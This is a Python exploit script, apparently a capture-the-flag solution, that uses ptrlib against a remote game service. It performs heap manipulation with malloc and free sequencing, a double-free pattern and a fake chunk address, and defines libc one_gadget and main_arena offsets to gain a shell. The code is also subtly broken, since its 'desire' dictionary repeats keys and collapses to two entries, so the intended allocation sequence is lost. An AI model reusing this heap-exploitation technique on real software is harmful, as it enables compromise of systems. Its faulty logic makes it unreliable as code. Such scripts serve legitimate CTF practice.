from ptrlib import *
import subprocess
from time import sleep

def go_on():
    sock.recvuntil("west?")
    sock.sendline("a")

def get_item(name):
    sock.recvuntil("item: ")
    sock.sendline(name)

def show_items():
    sock.recvuntil("weapon.\n")
    items = []
    for i in range(10):
        sock.recvuntil("{}. ".format(i + 1))
        items.append(sock.recvline().rstrip())
    return items

def use_item(n):
    sock.recvuntil("use? ")
    sock.sendline(str(n))

# 1 = malloc / 0 = free
desire = {
    1: b'A',
    1: b'B',
    0: 1,
    0: 2,
    0: 1,
    1: p64(0x602260 - 0x10),
    1: "taro",
    1: "abc123123123123",
}
n = len(desire)

libc = ELF("./libc.so.6")
sock = Socket("shell.actf.co", 19310)
#sock = Socket("127.0.0.1", 19310)
libc_one_gadget = 0xf1147
libc_main_arena = 0x3c4b20
delta = 0

while True:
    reality = []
    i = 0
    p = subprocess.Popen("./helper {}".format(n), shell=True, stdout=subprocess.PIPE)
    result, _ = p.communicate()
    for line in result.split(b'\n'):
        if line == b'malloc':
            reality.append(1)
            if desire[i] != 1:
                continue
            i += 1
        elif line == b'free':
            if desire[i] != 0:
                break
            reality.append(0)
            i += 1
        else:
            reality.append(-1)
    if i == len(desire):
        break
    sleep(1.0)

dump("Found our hope!")

i = 0
for move in reality:
    if move == -1:
        go_on()
    elif move == 0:
        use_item(desire[i])
        i += 1
    else:
        get_item(desire[i])
        i += 1
